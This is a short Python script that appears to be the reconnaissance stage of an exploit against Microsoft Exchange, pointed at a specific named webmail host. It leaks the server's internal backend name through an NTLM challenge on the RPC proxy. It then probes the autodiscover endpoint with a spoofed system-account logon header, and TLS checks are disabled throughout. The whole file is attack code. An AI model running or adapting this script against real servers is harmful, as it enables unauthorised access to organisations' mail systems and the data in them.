import urllib2
import httplib
import sys
import base64
import os
import ssl
import json
import requests
import re
import urllib3
from impacket import ntlm
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.packages.urllib3.exceptions import InsecureRequestWarning

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


HOST = "https://webmail.kwan.co.in"


print('Retrieving backend via RPC')
ntlmHash = "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
r = requests.Request('RPC_IN_DATA', HOST+'/rpc/rpcproxy.dll')
r.headers['Authorization'] = 'NTLM '+ntlmHash
sess = requests.Session()
r = sess.send(r.prepare(), verify=False)
if r.status_code != 401:
    raise Exception('RPC NTLM Session Auth received '+str(r.status_code))

serverChallengeBase64 =  r.headers['WWW-Authenticate'].split(' ')[1]
serverChallenge = base64.b64decode(serverChallengeBase64)
challenge = ntlm.NTLMAuthChallenge(serverChallenge)
hashData = ntlm.AV_PAIRS(challenge['TargetInfoFields'])
data = str(hashData.fields[3][1]).replace(' ','')
udata=data.decode("utf-8")
asciidata=udata.encode('ascii', 'replace')
print asciidata



URL = HOST + "/autodiscover/autodiscover.json"


r = urllib2.Request(URL,data="",headers={'Content-Type': 'text/xml',
                                        'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                        'msExchLogonMailbox': 'S-1-5-20',
                                                             })


            
try:
    r = urllib2.urlopen(r,context=ctx)
    datadn = r.read()
    print r.info()
except Exception as e:
    print e.read()
    print e.info()
    print e


